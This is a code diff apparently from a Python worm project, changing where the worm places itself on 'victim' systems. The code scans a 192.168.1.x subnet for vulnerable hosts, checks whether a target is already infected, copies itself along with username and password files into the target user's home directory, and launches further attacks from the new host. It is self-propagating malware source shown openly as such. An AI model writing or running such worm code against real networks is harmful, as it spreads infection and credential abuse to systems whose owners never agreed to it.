@@ -22,16 +22,16 @@ def main():
 
     # Set locations  to place on victim system
     worm_file = os.path.basename(__file__)
-    host_dir = os.path.dirname(__file__)
+    host_dir = os.path.dirname("") #__file__)
     if len(host_dir) > 0:
         host_dir = host_dir + "/"
-    worm.set_target_dir(host_dir)
     worm.set_host_dir(host_dir)
     # Sets target directory to be same as one as where it was launched
     worm.set_files([worm_file, username_file, password_file])
     worm.retrieve_vulnerable_hosts("192.168.1.", 10)
     # Find a target to infect, checks to make sure target hasn't previously been infected
     if worm.find_target_host():
+        worm.set_target_dir("/home/" + worm.username + "/")
         # Mark target system
         worm.place_worm()
         # Start attack from new system
